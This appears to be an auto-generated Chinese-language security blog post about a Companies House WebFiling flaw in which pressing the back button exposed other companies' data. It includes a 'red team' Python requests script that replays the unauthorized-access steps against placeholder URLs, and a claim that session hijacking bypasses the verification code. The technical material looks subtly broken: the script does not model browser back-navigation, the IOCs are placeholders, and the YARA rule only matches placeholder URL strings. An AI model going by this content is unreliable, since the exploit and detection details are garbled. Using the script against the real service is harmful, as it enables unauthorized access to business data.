---
layout: post
title:  "UK’s Companies House confirms security flaw exposed business data"
date:   2026-03-16 18:53:44 +0000
categories: [security]
severity: high
---

# 🔥 解析 Companies House 安全漏洞：利用「後退按鈕」進行未經授權的公司資料存取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak (未經授權的公司資料存取)
> * **關鍵技術**: Session Hijacking, Authentication Bypass, Web Application Vulnerability

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 漏洞源於 Companies House 的 WebFiling 系統中，當用戶登入並存取自己的公司資料後，選擇「為其他公司提交」並輸入其他公司的編號，系統會要求驗證碼，但如果用戶按下「後退按鈕」返回自己的公司資料頁面，實際上會返回被存取公司的資料頁面，從而實現未經授權的公司資料存取。
* **攻擊流程圖解**:
  1. 用戶登入 Companies House WebFiling 系統。
  2. 用戶存取自己的公司資料。
  3. 用戶選擇「為其他公司提交」並輸入其他公司的編號。
  4. 系統要求驗證碼。
  5. 用戶按下「後退按鈕」返回自己的公司資料頁面。
  6. 實際上返回被存取公司的資料頁面。
* **受影響元件**: Companies House WebFiling 系統（版本號未公開）。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要有 Companies House WebFiling 系統的登入權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 登入 Companies House WebFiling 系統
    session = requests.Session()
    login_url = "https://example.com/login"
    login_data = {"username": "your_username", "password": "your_password"}
    session.post(login_url, data=login_data)
    
    # 存取自己的公司資料
    company_url = "https://example.com/company/your_company_id"
    response = session.get(company_url)
    
    # 選擇「為其他公司提交」並輸入其他公司的編號
    submit_url = "https://example.com/submit/other_company_id"
    submit_data = {"company_id": "other_company_id"}
    response = session.post(submit_url, data=submit_data)
    
    # 按下「後退按鈕」返回自己的公司資料頁面
    back_url = "https://example.com/company/your_company_id"
    response = session.get(back_url)
    
    # 實際上返回被存取公司的資料頁面
    print(response.text)
    
    ```
* **繞過技術**: 可以使用 Session Hijacking 技術來繞過驗證碼的要求。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /company/your_company_id |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Companies_House_Vulnerability {
      meta:
        description = "Detects Companies House vulnerability"
        author = "Your Name"
      strings:
        $login_url = "https://example.com/login"
        $company_url = "https://example.com/company/your_company_id"
        $submit_url = "https://example.com/submit/other_company_id"
      condition:
        $login_url and $company_url and $submit_url
    }
    
    ```
* **緩解措施**: 更新 Companies House WebFiling 系統的版本，修復漏洞。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Session Hijacking (會話劫持)**: 想像兩個人同時使用同一台電腦，技術上是指攻擊者竊取用戶的會話 ID，從而實現未經授權的存取。
* **Authentication Bypass (驗證繞過)**: 想像攻擊者可以直接存取系統而無需驗證，技術上是指攻擊者使用技術手段繞過驗證機制。
* **Web Application Vulnerability (Web 應用漏洞)**: 想像攻擊者可以利用 Web 應用中的漏洞實現未經授權的存取，技術上是指 Web 應用中的安全漏洞。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/uks-companies-house-confirms-security-flaw-exposed-business-data/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1550/)


